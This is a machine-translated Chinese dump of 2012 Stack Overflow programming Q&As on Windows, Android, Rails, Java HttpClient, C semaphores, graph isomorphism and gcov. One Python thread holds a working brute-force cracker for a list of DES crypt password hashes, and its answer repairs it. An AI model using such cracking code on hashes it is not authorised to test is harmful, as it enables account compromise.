如果您不处理 WM_PAINT，则应将其传递给以`DefWindowProc()`验证客户区并重新绘制窗口。

看起来您正在摆脱开关/外壳并返回 0。我将替换：

```
return 0; 
```

和

```
return DefWindowProc(hwnd, uMsg, wParam, lParam); 
```

# java - OnListItemClick 只工作一次

> ID：13537697
> 
> 赞同：1
> 
> 时间：2012-11-24T02:22:06.150
> 
> 标签：java, android, listview

我正在开发一个列表视图，当您单击一个项目时，它会显示一个带有 2 个选项的警报对话框，在他们选择一个选项后，它会将它们带回列表视图，在那里他们可以再次选择另一个选项。出于某种原因，一旦我单击一个项目，如果我单击肯定按钮（其中包含代码的那个），然后尝试单击另一个项目，则不会弹出警报对话框。有谁知道为什么会发生这种情况？代码如下：

```
protected void onListItemClick(ListView l, View v, int position, long id) {
        final int i = position;
        try {
            new AlertDialog.Builder(this)
            .setTitle("Download")
            .setMessage("You have selected the level " + jArray.getJSONObject(i).getString("level_name") + ". Would you like to save it?")
            .setPositiveButton("Save", new DialogInterface.OnClickListener(){
                public void onClick(DialogInterface dialog, int which) {
                    try {
                        saveLevel(jArray.getJSONObject(i).getString("level_name"),jArray.getJSONObject(i).getInt("id"));
                    } catch (JSONException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                    return;
                } 
            })
            .setNegativeButton("Cancel",new DialogInterface.OnClickListener(){
                public void onClick(DialogInterface dialog, int which) {
                    return;
                } 
            })
            .show();
        } catch (JSONException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        super.onListItemClick(l, v, position, id);
    } 
```

如果您需要任何其他信息，请告诉我！提前致谢！

威廉

*编辑*

据我所知，它发生在 saveLevel 函数中，我将其发布在下面

```
public void saveLevel(String i, int id)
{
    InputStream is = null;
    ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
    nameValuePairs.add(new BasicNameValuePair("uid","demo"));
    String result = "";
    try
    {
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost("www.example.com/stuff.php");
        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
        HttpResponse response = httpclient.execute(httppost);
        HttpEntity entity = response.getEntity();
        is = entity.getContent();

        BufferedReader reader = new BufferedReader(new InputStreamReader(is,"iso-8859-1"),8);
        StringBuilder sb = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
            sb.append(line + "\n");
        }
        is.close();

        result=sb.toString();
        jArray = new JSONArray(result);
        File exst = Environment.getExternalStorageDirectory();
        String exstPath = exst.getPath();

        File filePath = new File(exstPath+"/Platformer/Downloaded");
        boolean success = filePath.mkdir();
        String path = filePath.getAbsolutePath() + "/" + i + ".xml";
        File newxmlfile = new File(path);
        try 
        {
            newxmlfile.createNewFile();
        } 
        catch (IOException e) 
        {
            e.printStackTrace();

        }
        FileOutputStream fileos = null;        
        try
        {
            fileos = new FileOutputStream(newxmlfile);
        }
        catch(FileNotFoundException e)
        {
            Log.e("FileNotFoundException", "can't create FileOutputStream");
            return;
        }
        OutputStreamWriter output = new OutputStreamWriter(fileos);
        output.write(jArray.getJSONObject(0).getString("level_data"));
        output.flush();
        output.close();
    }
    catch(Exception e)
    {
        Log.e("log_tag", "Error parsing data "+e.toString());
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:06:49.667

您的`saveLevel()`函数做了很多不适合 UI 线程的事情（网络访问、文件访问）。您应该将这些东西分离到一个后台线程中，最好使用`AsyncTask`（[教程](http://www.vogella.com/articles/AndroidPerformance/article.html)）。

`saveLevel()`当您尝试单击另一个列表项时，很可能您的程序仍然卡住。如果你想检查这个假设是否真的正确，只需`return;`在开头放一行，`saveLevel()`看看你的对话框是否按预期弹出。

# python - Python：为什么我会收到 NameError？

> ID：13537699
> 
> 赞同：0
> 
> 时间：2012-11-24T02:22:44.480
> 
> 标签：python

我有以下代码：

```
from crypt import crypt
import itertools
from string import ascii_letters, digits

def decrypt(all_hashes, salt, charset=ascii_letters + digits + "-"):
     products = (itertools.product(charset, repeat=r) for r in range(8))
     chain = itertools.chain.from_iterable(products)
     for candidate in chain:
         hash = crypt(candidate, salt)
         if hash in all_hashes:
              yield candidate, hash
              all_hashes.remove(hash)
              if not all_hashes:
                 return

all_hashes = 'aaRrt6qwqR7xk', 'aaacT.VSMxhms' , 'aaWIa93yJI9kU', /
'aakf8kFpfzD5E', 'aaMOPiDnXYTPE', 'aaz71s8a0SSbU', 'aa6SXFxZJrI7E', /
'aa9hi/efJu5P.', 'aaBWpr07X4LDE', 'aaqwyFUsGMNrQ', 'aa.lUgfbPGANY', /
'aaHgyDUxJGPl6', 'aaTuBoxlxtjeg', 'aaluQSsvEIrDs', 'aajuaeRAx9C9g', /
'aat0FraNnWA4g', 'aaya6nAGIGcYo', 'aaya6nAGIGcYo', 'aawmOHEectP/g', /
'aazpGZ/jXGDhw', 'aadc1hd1Uxlz.', 'aabx55R4tiWwQ', 'aaOhLry1KgN3.', /
'aaGO0MNkEn0JA', 'aaGxcBxfr5rgM', 'aa2voaxqfsKQA', 'aahdDVXRTugPc', /
'aaaLf47tEydKM', 'aawZuilJMRO.w', 'aayxG5tSZJJHc', 'aaPXxZDcwBKgo', /
'aaZroUk7y0Nao', 'aaZo046pM1vmY', 'aa5Be/kKhzh.o', 'aa0lJMaclo592', /
'aaY5SpAiLEJj6', 'aa..CW12pQtCE', 'aamVYXdd9MlOI', 'aajCM.48K40M.', /
'aa1iXl.B1Zjb2', 'aapG.//419wZU'

all_hashes = set(all_hashes)
salt = 'aa'
for candidate, hash in decrypt(all_hashes, salt):
     print 'Found', hash, '! The original string was', candidate 
```

当我去运行它时，我得到以下回溯错误：

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<stdin>", line 5, in decrypt
NameError: must be string, not tuple 
```

我认为这与我的“all_hashes”变量有关，但如果我取出逗号，所有不同的哈希都存储为一个长字符串

有人请阐明一下，在此先感谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:28:46.070

`product`s 是元组，比如

```
('g', 'g', 'g', 'e', 'a', 'b', 'f') 
```

并`crypt`期望一个字符串。

在将元组传递给之前将它们转换为字符串`crypt`，

```
 for candidate in chain:
     hash = crypt((''.join(candidate)), salt) 
```

（感谢[Joel Cornett](https://stackoverflow.com/users/1142167/joel-cornett)对字符串的出色转换，以及[HVNSweeting](https://stackoverflow.com/users/807703/hvnsweeting)的改进。）

# html - Rails 形式的文本区域

> ID：13537700
> 
> 赞同：3
> 
> 时间：2012-11-24T02:23:59.400
> 
> 标签：html, ruby-on-rails

我在 Rails 中有一个 HTML 表单：

```
<form id="my_form" action="submit">
  Title: <input type="text" name="title"> 
</form> 
```

我想使用 a 添加一个新字段`<textarea>`：

```
Comment: <textarea rows="4" cols="50"></textarea> 
```

如果把这个放到表格里可以吗？如何访问用户填写的值？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-24T03:23:36.423

除非您有充分的理由不这样做，否则您应该真正使用 rails 提供的操作视图助手。

[表单助手](http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html)提供了面向资源的方法，这些方法围绕特定模型对象创建表单和范围，但这不适合您的情况。

您想要的是使用通用[表单标签助手](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html)，其中包括不绑定到任何特定模型或记录的表单方法的通用版本，例如：[`form_tag`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html#method-i-form_tag)、、、[`text_field_tag`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html#method-i-text_field_tag)等[`text_area_tag`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html#method-i-text_area_tag)。这些方法不需要您将记录传递给它们或根据特定模型定义它们；您可以定义任意操作、ID 等，如下所示：

```
<%= form_tag "submit", :id => "my_form" do -%>
  Title: <%= text_field_tag "title" %>
  Comment: <%= text_area_tag "comment", :rows => 4, :cols => 50 %>
  <%= submit_tag "Submit" %>
<% end -%> 
```

请注意，您的 textarea 上没有`name`or `id`，所以我任意为它们分配了 string `"comment"`，这对于这种情况是有意义的。

在访问用户输入的值方面，您只需像任何其他形式一样进行操作，即在您的控制器中您只需访问`params[:title]`等`params[:comment]`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T03:10:15.363

如果您使用 form_tag 助手，那么您可以按如下方式创建 textarea：

```
 text_area_tag(:comment, nil, :rows => 5, :cols => 15) 
```

您的 form_tag 代码如下：

```
 <% form_tag :action => :submit do %>
  <%= label_tag "Title" %>
  <%= text_field_tag :title %>
  <%= text_area_tag :comment, nil, :rows => 5, :cols => 15 %>
  <%= submit_tag "submit" %>
  <% end %> 
```

你应该在你的控制器中有一个叫做 submit 的方法。在该方法中，您可以使用参数访问评论。例如评论可以作为 params[:comment] 访问

有关更多信息，请参阅：[forms_and_tags](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T02:58:23.680

当用户按下标题时使用这种方式怎么样：框将突出显示它给用户更多的灵活性。

```
<form id="my_form" action="submit">
<label for="title">Title: </label>
<input type="text" name="title" id="title"> 
</form> 
```

# java - 使用 apache-httpClient，getResponseBodyAsStream 结果不一样

> ID：13537702
> 
> 赞同：1
> 
> 时间：2012-11-24T02:24:28.697
> 
> 标签：java, io, httpclient

我使用httpClient3.1。我认为`length buffer.length`此时 a.txt 包含所有内容。但事实并非如此。使用前`getMethod.getResponseBodyAsStream`，使用 `getMethod.getResponseBodyAsString.everything`良好。例如

```
public static void testGetResponseBodyAsStream() throws HttpException, IOException{
                /*test stackoverflow.com*/
        String uri="http://www.stackoverflow.com";
                /*uses httpClient 3.1*/
        HttpClient httpClient=new HttpClient();
        GetMethod getMethod=new GetMethod(uri);
        httpClient.executeMethod(getMethod);
                /*get result write file */
        FileOutputStream fileOutputStream=new FileOutputStream(new File("c:/a.txt"));
                /*buffer is Large enough*/ 
        byte[] buffer=new byte[1024*1024];
        BufferedInputStream bufferedInputStream=new BufferedInputStream(getMethod.getResponseBodyAsStream());
                /*While  length<buffer.length then a.txt  contains all of   
                content.But it's no.  
                Before uses getMethod.getResponseBodyAsStream, uses                         
                getMethod.getResponseBodyAsString.everything is good . */     
        int length=bufferedInputStream.read(buffer,0,buffer.length);
        fileOutputStream.write(buffer, 0, buffer.length);
        fileOutputStream.close();
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:24:10.727

试试这个，看起来你可能没有调用一些需要的方法：

```
String url = "https://login.yahoo.com";
String _strGetRspBody;
String _strPostRspBody;
int port = 443;
HttpClient httpClient = new HttpClient(new MultiThreadedHttpConnectionManager());
httpClient.getHostConfiguration().setHost(url, port, "https");
GetMethod authget = new GetMethod(url);
try {
    httpClient.executeMethod(authget);
} catch (IOException i) {
    logger.error(i.toString());
}
InputStream d = authget.getResponseBodyAsStream(); 
```

# javascript - MVC3 jquery ajax json 数据

> ID：13537704
> 
> 赞同：0
> 
> 时间：2012-11-24T02:25:54.580
> 
> 标签：javascript, json, asp.net-mvc-3

我正在尝试解析从我的控制器调用的 web 服务中检索到的 json。现在，只是为了显示 json 字符串，我已经这样做了

```
 $.ajax({
        url: this.href,
        type: 'GET',
        dataType: "json",
        data: { myPartNo: returnVal },
        success: function (result) { 
            ShowJson(result);
        }
    }); 
```

我只是将 json 字符串数据作为文本显示在 div 中（它有效），但基本上，我只想要该 json 中的一些值，例如“颜色”和“大小”。好的，所以像对象数组反序列化等词汇是我需要帮助的地方。我可能在其他项目中做过，但不知道它叫什么。我需要做什么？从控制器端还是仅在 javascript 中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:37:58.250

在服务器端，您通常会定义一些 DTO（数据传输对象），其中包含以下所有内容：

```
public class MyDTO
{
public string value {get; set;}
public string color {get; set;}
public int size {get; set;}
} 
```

在您的控制器中，您只需将其包装到 Json 中：

```
ActionResult MyController(int whatever)
{
MyDTO model = new MyDTO();
model.value = ...
return this.Json(model);
} 
```

在客户端，您读取结果并将其视为常规对象，例如：

```
ShowJson(result.color); 
```

//或者

```
$("#mydiv").css("color", result.color); // for example 
```

# ruby-on-rails - 使用 Ruby/Unix 抓取硬盘驱动器

> ID：13537707
> 
> 赞同：0
> 
> 时间：2012-11-24T02:26:47.497
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, unix, web-crawler

以前，我在网上翻了翻，没有找到太多关于这个话题的信息。我正在寻找一些 ruby​​ 代码来扫描我的硬盘驱动器以获取特定信息（例如电话号码）。我已经构建了几个正则表达式来找到我正在寻找的东西；但是，我不确定实现它们的核心逻辑是什么样的。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:30:04.213

您应该遍历文件系统，递归目录，并将您的例程应用于每个文件。我只是使用[find 命令](http://netbsd.gw.com/cgi-bin/man-cgi?find+1+NetBSD-current)的组合，从您的文件系统根目录开始，然后将每个文件交给您的例程。我不知道如何使用纯红宝石来做到这一点，但我期待其他人提供他们的智慧。

由于您使用的是[ruby](http://ruby-lang.org)​​ ，因此这是我发现的一些（未经测试的）[代码](http://drawohara.com/post/8166787/ruby-crawling-filesystem-efficiently)：

```
require ’rubygems’
require ’alib’ 

count = 0
alib.util.find2 ‘/’ do |entry, stat|
   count += 1 if stat.file?
end 
```

看来您需要[alib](http://rubygems.org/gems/alib) gem 来运行它，让我知道它是如何工作的。

# javascript - 在地图画布上获取地理位置作为用户的输入

> ID：13537712
> 
> 赞同：0
> 
> 时间：2012-11-24T02:27:22.637
> 
> 标签：javascript, google-maps, jquery-ui-map

我正在尝试构建一个基于地理位置的应用程序。此类应用程序的先决条件是获得用户的准确地理位置。使用 HTML5 可以按如下方式完成：

```
 if (navigator.geolocation) {
          var timeoutVal = 10 * 1000 * 1000;
          navigator.geolocation.getCurrentPosition(
              displayPosition, 
              displayError,
              { enableHighAccuracy: true, timeout: timeoutVal, maximumAge: 0 }
          );
      } 
```

但是如果浏览器只有IP地址，那就很不准确了。 [这篇文章](http://whatismyipaddress.com/geolocation-accuracy)也提到了这一点。在这种情况下，为了准确起见，我希望我的用户通过地图界面定位他们的位置。

1.  向用户展示一个谷歌地图实例。

2.  要求他们在当前位置添加标记。

3.  完成后，向服务器发送一个 post 请求。

我找到了一个库[jquery ui 地图](http://code.google.com/p/jquery-ui-map/wiki/Examples)，但未指定如何在谷歌地图画布上从用户那里获取输入。有人可以帮我在谷歌地图画布上接受用户的输入吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:10:52.650

如果您想使用 jquery 地图，只需查看[此示例](http://jquery-ui-map.googlecode.com/svn/trunk/demos/jquery-google-maps-geocoding.html)并将 findLocation 函数替换为代码以存储地理坐标。

# c - 我如何判断信号量是否已被销毁，如果没有销毁它

> ID：13537715
> 
> 赞同：1
> 
> 时间：2012-11-24T02:27:52.900
> 
> 标签：c, semaphore, posix-api

我有三个POSIX？信号量和几个错误条件。信号量是全局可访问的。我如何检查它们是否在发生错误之前被销毁（或者它们是否首先被初始化）。

```
// Example c program
#include <semaphore.h>

sem_t mySemaphore;

void errorHandling(){
    // if (mySemaphore exists)
    //     sem_destroy(&mySemaphore);
}

int main(){

    // possible errors

    if ((sem_init(&mySemaphore, 0, 1)) < 0)
        errorHandling();

    // more possible errors and multi threading stuff

    sem_destroy(&mySemaphore);

    return (EXIT_SUCCESS);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:11:08.013

您需要一个单独的标志，默认情况下为 false。初始化时设置为真，销毁时返回假。

如果是多线程应用程序，请确保您使用互斥锁保护这些访问。另外，我强烈建议您编写函数来在一个地方处理所有这些。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-07-22T08:28:55.573

参考 OP 的代码，并根据 sem_init() 手册页，在可能已经初始化的信号量上调用该函数会导致未定义的行为。如果您不关心潜在的竞争，您可以尝试调用 sem_getvalue() 并使用其 EINVAL 返回值来测试先前信号量的初始化。

# algorithm - 如何部分比较两个图表

> ID：13537716
> 
> 赞同：6
> 
> 时间：2012-11-24T02:28:05.547
> 
> 标签：algorithm

例如，这两个图被认为是完美的部分匹配：

0 - 1

1 - 2

2 - 3

3 - 0

和

0 - 1

1 - 2

这两个被认为是一个糟糕的匹配

0 - 1

1 - 2

2 - 3

3 - 0

和

0 - 1

1 - 2

2 - 0

数字不必匹配，只要这些节点之间的关系可以完美匹配即可。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-24T02:42:43.657

这是子图同构问题：[http ://en.wikipedia.org/wiki/Subgraph_isomorphism_problem](http://en.wikipedia.org/wiki/Subgraph_isomorphism_problem)

由于 Ullmann，文章中提到了一种算法。

Ullmann 算法是深度优先搜索的扩展。深度优先搜索的工作方式如下：

```
def search(graph,subgraph,assignments):
  i=len(assignments)

  # Make sure that every edge between assigned vertices in the subgraph is also an
  # edge in the graph.
  for edge in subgraph.edges:
    if edge.first<i and edge.second<i:
      if not graph.has_edge(assignments[edge.first],assignments[edge.second]):
        return False

  # If all the vertices in the subgraph are assigned, then we are done.
  if i==subgraph.n_vertices:
    return True

  # Otherwise, go through all the possible assignments for the next vertex of
  # the subgraph and try it.
  for j in possible_assignments[i]:
    if j not in assignments:
      assignments.append(j)
      if search(graph,subgraph,assignments):
        # This worked, so we've found an isomorphism.
        return True
      assignments.pop()

def find_isomorphism(graph,subgraph):
  assignments=[]
  if search(graph,subgraph,assignments):
    return assignments
  return None 
```

对于基本算法，`possible_assignments[i] = range(0,graph.n_vertices)`. 也就是说，所有的顶点都是一种可能性。

Ullmann 通过缩小可能性扩展了这个基本算法：

```
def update_possible_assignments(graph,subgraph,possible_assignments):
  any_changes=True
  while any_changes:
    any_changes = False
    for i in range(0,len(subgraph.n_vertices)):
      for j in possible_assignments[i]:
        for x in subgraph.adjacencies(i):
          match=False
          for y in range(0,len(graph.n_vertices)):
            if y in possible_assignments[x] and graph.has_edge(j,y):
              match=True
          if not match:
            possible_assignments[i].remove(j)
            any_changes = True 
```

这个想法是，如果子图的节点 i 可能匹配图的节点 j，那么对于子图中与节点 i 相邻的每个节点 x，必须有可能找到与节点 j 相邻的节点 y在图中。这个过程的帮助比最初显而易见的要多，因为每次我们消除一个可能的分配，这可能会导致其他可能的分配被消除，因为它们是相互依赖的。

那么最终的算法是：

```
def search(graph,subgraph,assignments,possible_assignments):
  update_possible_assignments(graph,subgraph,possible_assignments)

  i=len(assignments)

  # Make sure that every edge between assigned vertices in the subgraph is also an
  # edge in the graph.
  for edge in subgraph.edges:
    if edge.first<i and edge.second<i:
      if not graph.has_edge(assignments[edge.first],assignments[edge.second]):
        return False

  # If all the vertices in the subgraph are assigned, then we are done.
  if i==subgraph.n_vertices:
    return True

  for j in possible_assignments[i]:
    if j not in assignments:
      assignments.append(j)

      # Create a new set of possible assignments, where graph node j is the only 
      # possibility for the assignment of subgraph node i.
      new_possible_assignments = deep_copy(possible_assignments)
      new_possible_assignments[i] = [j]

      if search(graph,subgraph,assignments,new_possible_assignments):
        return True

      assignments.pop()
    possible_assignments[i].remove(j)
    update_possible_assignments(graph,subgraph,possible_assignments)

def find_isomorphism(graph,subgraph):
  assignments=[]
  possible_assignments = [[True]*graph.n_vertices for i in range(subgraph.n_vertices)]
  if search(graph,subgraph,assignments,possible_assignments):
    return assignments
  return None 
```

# ruby-on-rails - 使用 mysql2 服务器启动并运行 RailsKits SaaS 应用程序

> ID：13537722
> 
> 赞同：1
> 
> 时间：2012-11-24T02:28:36.223
> 
> 标签：ruby-on-rails, development-environment, mysql2

我对 Rails 游戏还很陌生；我是一名前端开发人员，自学编程。我已经构建了一个 Web 应用程序，并决定使用[RailsKit SaaS](http://railskits.com/saas/)工具包来处理我的注册等。我在启动和运行默认应用程序时遇到了问题，但我确定这是由于我缺乏知识，我认为这与设置 mysql 服务器有关（通常我使用 sqlite3，但这并不似乎也不适用于此应用程序）。

这是我遇到的过程和错误，我仍然无法创建数据库或启动服务器......

1.  **下载了应用程序**

2.  **冉`bundle install`。**得到以下错误：

    ```
    Gem::InstallError: factory_girl requires Ruby version >= 1.9.2\. 
    An error occurred while installing factory_girl (4.1.0), and Bundler cannot continue.
    Make sure that `gem install factory_girl -v '4.1.0'` succeeds before bundling. 
    ```

3.  **发现我在 Ruby 版本 1.8.7 上运行**，所以我将它添加到 Gemfile：

    ```
    gem 'rake','1.9.2' and **updated my system** to 1.9.2 
    ```

4.  **跑`bundle install`**并得到以下错误：

    ```
    An error occurred while installing mysql2 (0.3.11), and Bundler cannot continue.
    Make sure that `gem install mysql2 -v '0.3.11'` succeeds before bundling. 
    ```

5.  **所以我跑了`gem install mysql2 -v '0.3.11`**，得到以下错误：

    ```
    ERROR:  Error installing mysql2:
    ERROR: Failed to build gem native extension.

    /Users/trevanhetzel/.rvm/rubies/ruby-1.9.3-p327/bin/ruby extconf.rb
    checking for rb_thread_blocking_region()... yes
    checking for rb_wait_for_single_fd()... yes
    checking for mysql_query() in -lmysqlclient... no
    checking for main() in -lm... yes
    checking for mysql_query() in -lmysqlclient... no
    checking for main() in -lz... yes
    checking for mysql_query() in -lmysqlclient... no
    checking for main() in -lsocket... no
    checking for mysql_query() in -lmysqlclient... no
    checking for main() in -lnsl... no
    checking for mysql_query() in -lmysqlclient... no
    checking for main() in -lmygcc... no
    checking for mysql_query() in -lmysqlclient... no
    *** extconf.rb failed ***
    Could not create Makefile due to some reason, probably lack of necessary libraries and/or headers.  Check the mkmf.log file for more details.  You may need configuration options. 
    ```

这就是我所在的地方。如果这有帮助，经过上述所有步骤，我尝试创建一个数据库`rake db:create`并得到

```
Could not find gem 'mysql2 (>= 0) ruby' in the gems available on this machine. 
```

所以我猜我的机器上没有安装 MySQL？似乎有点奇怪，因为我一直使用 MAMP 和 MySQL 服务器。

任何为我指明正确方向的帮助都是好人！对此，我真的非常感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T04:04:50.653

在安装 mysql2 gem 之前，您需要在系统中安装 mysql 客户端和服务器。所以试试这个。

```
 $sudo apt-get update
  $sudo apt-get install mysql-server mysql-client 
```

在此之后尝试安装 gem mysql2

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T03:02:21.507

`bundle exec rake db:migrate`这听起来像。

# ios - iCloud 中的 NSDictionary（存储视图控制器）

> ID：13537727
> 
> 赞同：0
> 
> 时间：2012-11-24T02:29:37.963
> 
> 标签：ios, icloud

我的视图控制器有很多布尔值、字符串和整数，它们使用 NSCoding 保存，然后几个类保存更多相同类型的信息。我通过将视图控制器放在 NSMutableDictionary 中并使用 NSKeyedArchive 保存它来将它们联系在一起。

```
NSMutableDictionary *rootObject;
rootObject = [NSMutableDictionary dictionary];
[rootObject setValue:self.controllers forKey:@"controllers"];
[NSKeyedArchiver archiveRootObject:rootObject toFile:path]; 
```

使用 NSKeyedUnarchiver 设置视图控制器会带回所有的 NSCoded 数据，并且效果很好。

我正在考虑实施 iCloud，但对实现它的最佳方式感到困惑。如果我将 NSMutableDictionary 存储在专门用于保存的 UIDocument 类中然后加载它，它会携带 NSCoded 值吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T02:55:36.257

归档只是意味着将某些东西变成 NSData 对象。一个 NSData 对象是一个 NSData 对象。它不会因为存储在云中而神秘地失去其完整性。如果它在从您保存它的任何地方（例如用户默认值、磁盘上的文件等）取消归档时工作，那么当您从云中取消归档时它也会工作。

您可能不需要 UIDocument 的开销。请记住，iCloud 可以有效地让您在云中保留相当于 NSUserDefaults 类型的数据（“键值存储”） - 它不计入用户的 5MB 限制。

# c++ - 使用 C++ 向 ADO 记录集添加多条记录的最快方法

> ID：13537728
> 
> 赞同：1
> 
> 时间：2012-11-24T02:30:07.910
> 
> 标签：c++, asp-classic, oledb, ado

我们有一个数据模型，它支持托管在多台服务器上的单表数据库。然而，我们偶尔需要编译来自多个表的数据以显示在经典的 ASP 页面上。这是在 C++ 中的 COM 对象中完成的。我们使用 OleDb 从 SQL Server 收集数据，OleDb 逻辑将数据直接写入 C++ 结构。然后我们循环遍历结构数组，将数据添加到 SafeArrays，然后将它们添加到记录集中。将数据添加到记录集的逻辑大致如下（省略初始化和错误处理逻辑）：

```
SAFEARRAY* fields; // Initialised to integer array 0 -> max fields
SAFEARRAY* values;
VARIANT* arraydata;

... //  initialisation logic

SafeArrayAccessData(values, reinterpret_cast<void**>(&arrayData));

for(unsigned int i = 0; i < numDataValues1; ++i)
{
    // Add data
    arraydata[0].intVal = data[i].someValue;
    ... // etc.

    for(unsigned int j = 0; j < numDataValues2; ++j)
    {
        arraydata[21].intVal = data2[j].someValue;
        ... // etc.

        _recordset->raw_AddNew(fields, values);
        _recordset->Update();
    }
} 
```

但是，它相对较慢。添加 1000 行数据可能需要一秒钟，这在我们的环境中太长了。如果我注释掉对 raw_AddNew 和 Update 的调用，逻辑就会飞起来。所以问题在于我如何将数据添加到记录集中。任何建议或意见都非常感谢。提前非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T04:12:33.823

我已经有很长时间没有编写 ADO 数据库连接的代码了，但是如果我没记错的话，您需要将锁定更改为 adLockBatchOptimistic，然后进行批量更新。这种方式要快得多。

[这可能会帮助你](http://msdn.microsoft.com/en-us/library/windows/desktop/ms678067(v=vs.85).aspx)

如果我没记错的话，它仍然很慢。

# visual-studio - 将 profile-guided 编译报告到源代码

> ID：13537733
> 
> 赞同：0
> 
> 时间：2012-11-24T02:31:58.240
> 
> 标签：visual-studio, optimization, gcc, compilation, branch-prediction

在这个问题中，我将关注 Visual Studio 2012 和 GCC 4.7

一方面，配置文件引导编译通过在运行时检测代码，然后在第二次编译期间使用此信息来优化分支预测。另一方面，许多编译器提供扩展来提示编译器最有可能采用哪个分支：GCC 提供`__builtin_expect`，Visual Studio 提供`__assume`.

有没有办法提取（任一编译器的）配置文件引导信息，以便能够使用两个编译器扩展重写代码？目标是为愿意重新编译他们自己的二进制版本的人们提供“优化”的源代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T11:06:53.413

您可以使用 提取此信息`gcov`。

编译源，如：

```
gcc -ftest-coverage -fprofile-arcs x.c 
```

运行可执行文件

```
./a.out 
```

`gcov -b`在源文件上运行。该选项`-b`告诉它生成分支概率信息。

```
gcov -b x.c 
```

`gcov`将创建包含所需信息的文本文件`x.c.gcov`，这是一个示例：

```
 -:    5:int
function foo called 1 returned 100% blocks executed 100%
        1:    6:foo (unsigned int N)
        -:    7:{
        1:    8:  int i, s = 0;
        -:    9:
    10001:   10:  for (i = 0; i < N; ++i)
branch  0 taken 99%
branch  1 taken 1% (fallthrough)
        -:   11:    {
    10000:   12:      if ((rand () % 100) < 30)
call    0 returned 100%
branch  1 taken 30% (fallthrough)
branch  2 taken 70%
     3027:   13:        s++;
        -:   14:      else
     6973:   15:        s--;
        -:   16:    }
        -:   17:
        1:   18:  return s;
        -:   19:} 
```

# jgit - 如何使用 JGit 获取已更改文件的列表？

> ID：13537734
> 
> 赞同：5
> 
> 时间：2012-11-24T02:32:19.380
> 
> 标签：jgit, git-log

使用 JGit，我想通过 git log --name-status 获取提交时更改的文件列表。

这可能吗？如果是这样，你怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T19:39:27.973

我使用来自伟大的[GitBlit-Tool](http://gitblit.com/)的 JGitUtils 的修改版本：

查看[方法的来源](https://github.com/gitblit/gitblit/blob/master/src/main/java/com/gitblit/utils/JGitUtils.java#L718) `getFilesInCommit`以了解其工作原理（`PathChangeModel`仅用于保存数据。）

# javascript - 调用函数时，“fn()”与“fn()”的处理方式不同吗？

> ID：13537735
> 
> 赞同：1
> 
> 时间：2012-11-24T02:32:28.530
> 
> 标签：javascript

[在 JavaScript](https://stackoverflow.com/q/8445216/1615483)中使用方括号时有[一些约定](http://javascript.crockford.com/code.html)，但是当使用方括号进行调用时，它们实际上是否得到了不同的处理。

与人类读者**有何**`fn ()`不同？`fn()`

 **此外， 和 之间是否有区别`(fn)()`，`fn()`如果有，它们中的哪一个会`fn ()`相似？

* * *

对于这个问题`fn`可以是任何函数`function fn() {}`或`var fn = function () {}`

* * *

**编辑**：这个问题不是“他们会有相同的结果吗？”，而是关于 JavaScript 编译器是否/如何对待它们。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:36:20.117

没有区别，`fn () = fn() = (fn)()`但`function fn() {} != var fn = function() {}`因为[吊装](http://www.adequatelygood.com/2010/2/JavaScript-Scoping-and-Hoisting)的工作方式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T02:35:36.360

不，, `fn()`, `fn ()`,`(fn)()`和`(fn) ()`所有的意思都是一样的。**

# asp.net - ASP.net MachineKey.Encode 更改机器密钥

> ID：13537737
> 
> 赞同：0
> 
> 时间：2012-11-24T02:33:03.857
> 
> 标签：asp.net, encryption, encryption-symmetric

.Net 中的新 MachineKey.Encode/MachineKey.Decode 功能似乎使加密更容易。

我的问题是，如果您需要定期修改 MachineKey，是否需要 3 个步骤？

1.  解密和存储现有数据
2.  修改机器密钥
3.  重新加密并存储加密数据

或者有没有办法使用两个不同的密钥调用 MachineKey.Encrypt/.Decrypt？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T05:21:54.393

您尝试将数据存储多长时间？这些方法通常用于保护 cookie 中的往返数据或值，而不是用于长期数据存储。

